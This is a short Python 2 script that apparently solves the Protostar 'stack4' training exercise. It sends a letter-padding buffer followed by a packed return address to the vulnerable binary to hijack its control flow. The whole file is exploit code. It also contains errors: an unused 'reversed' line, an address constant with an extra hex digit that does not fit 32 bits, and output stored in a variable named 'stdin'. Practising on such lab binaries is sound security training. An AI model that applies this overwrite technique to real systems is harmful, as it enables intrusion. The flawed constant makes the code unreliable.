#!/usr/bin/env python2.6

from utils import run_file_with_stdin
import struct

buff = "".join([l * 3 for l in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"])
buff = buff[:len(buff) - 2]

flag = reversed('\x08\x04\x83\xf4')
flag = struct.pack("I", 0x0804832f4)


payload = buff + "".join(flag)

stdin, stderr = run_file_with_stdin("/opt/protostar/bin/stack4", payload)
print stdin
print "\n----------------------\n"
print stderr
